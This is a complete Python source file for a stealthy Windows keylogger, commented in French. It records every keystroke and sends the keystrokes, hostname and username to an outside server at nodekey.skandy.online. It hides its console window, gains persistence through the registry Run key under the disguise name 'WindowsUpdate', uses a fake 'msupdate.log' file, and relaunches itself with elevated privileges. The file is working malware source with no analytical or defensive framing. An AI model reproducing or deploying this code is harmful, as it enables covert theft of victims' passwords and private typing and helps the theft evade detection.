#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Keylogger léger et discret pour Windows
"""

import os
import sys
import time
import json
import win32api
import win32con
import win32gui
import pythoncom
import pyWinhook
from datetime import datetime
from pathlib import Path
import ctypes
import urllib.request

# Configuration
CONFIG = {
    'log_file': str(Path('~/AppData/Local/Temp/msupdate.log').expanduser()),
    'mutex_name': 'Global\\WindowsUpdateChecker',
}

class KeyLogger:
    def __init__(self):
        self.last_send = time.time()
        self.buffer = []
        self.running = True
        self.setup_mutex()
        
    def setup_mutex(self):
        """Empêche les instances multiples"""
        try:
            self.mutex = ctypes.windll.kernel32.CreateMutexW(None, False, CONFIG['mutex_name'])
            if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
                sys.exit(0)
        except Exception as e:
            self.log_error(f"Erreur mutex: {e}")
            sys.exit(1)
    
    def log_error(self, message):
        """Journalise les erreurs localement"""
        try:
            with open(CONFIG['log_file'], 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now()}] {message}\n")
        except:
            pass
    
    def on_key_event(self, event):
        """Appelé à chaque frappe de touche"""
        try:
            # Ignorer les touches spéciales non-imprimables
            if event.Ascii > 31 and event.Ascii < 127:
                char = chr(event.Ascii)
            elif event.Key == 'Return':
                char = '\n'
            elif event.Key == 'Space':
                char = ' '
            elif event.Key == 'Tab':
                char = '\t'
            else:
                char = f'[{event.Key}]'
            
            self.buffer.append(char)
            
            # Envoyer périodiquement ou quand le buffer atteint une certaine taille
            if (time.time() - self.last_send > 30) or (len(self.buffer) > 100):
                self.send_data()
                
        except Exception as e:
            self.log_error(f"Erreur capture touche: {e}")
            
        return True
    
    def send_data(self):
        """Envoie les données capturées au serveur"""
        if not self.buffer:
            return
            
        try:
            # Préparer les données au format du serveur
            data = {
                'keys': ''.join(self.buffer),
                'timestamp': datetime.utcnow().isoformat(),
                'hostname': os.environ.get('COMPUTERNAME', 'Unknown'),
                'username': os.environ.get('USERNAME', 'Unknown'),
                'userAgent': f"Python/{sys.version.split()[0]} on {sys.platform}"
            }
            
            url = 'http://nodekey.skandy.online/keylog/batch'
            headers = {'Content-Type': 'application/json'}
            
            # Encoder les données en JSON
            json_data = json.dumps(data).encode('utf-8')
            
            # Créer la requête et l'envoyer
            req = urllib.request.Request(url, data=json_data, headers=headers, method='POST')
            with urllib.request.urlopen(req) as response:
                result = response.read().decode('utf-8')
                print(f'Données envoyées: {result}')
            
            # Réinitialiser le buffer après envoi réussi
            self.buffer = []
            self.last_send = time.time()
            
        except Exception as e:
            self.log_error(f"Erreur envoi données: {e}")
    
    def install_persistence(self):
        """Installe la persistance via la clé de registre"""
        try:
            key = win32api.RegOpenKeyEx(
                win32con.HKEY_CURRENT_USER,
                'Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                0, win32con.KEY_SET_VALUE
            )
            
            exe_path = os.path.abspath(sys.argv[0])
            win32api.RegSetValueEx(key, 'WindowsUpdate', 0, win32con.REG_SZ, exe_path)
            win32api.RegCloseKey(key)
            
        except Exception as e:
            self.log_error(f"Erreur installation persistance: {e}")
    
    def hide_console(self):
        """Cache la fenêtre de console sous Windows"""
        try:
            window = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(window, win32con.SW_HIDE)
        except:
            pass
    
    def start(self):
        """Démarre le keylogger"""
        try:
            # Cacher la console
            self.hide_console()
            
            # Installer la persistance
            self.install_persistence()
            
            # Configurer le hook clavier
            hm = pyWinhook.HookManager()
            hm.KeyDown = self.on_key_event
            hm.HookKeyboard()
            
            # Boucle principale
            while self.running:
                pythoncom.PumpWaitingMessages()
                time.sleep(0.1)
                
                # Envoyer périodiquement même sans activité
                if time.time() - self.last_send > 300:  # 5 minutes
                    self.send_data()
                    
        except Exception as e:
            self.log_error(f"Erreur keylogger: {e}")
            time.sleep(60)
            self.start()

def is_admin():
    """Vérifie si le programme s'exécute avec les droits administrateur"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def main():
    # Vérifier les privilèges admin
    if not is_admin():
        # Relancer avec élévation de privilèges
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)
    
    # Démarrer le keylogger
    try:
        kl = KeyLogger()
        kl.start()
    except Exception as e:
        with open(CONFIG['log_file'], 'a', encoding='utf-8') as f:
            f.write(f"[ERREUR CRITIQUE] {e}\n")
        sys.exit(1)

if __name__ == "__main__":
    main()
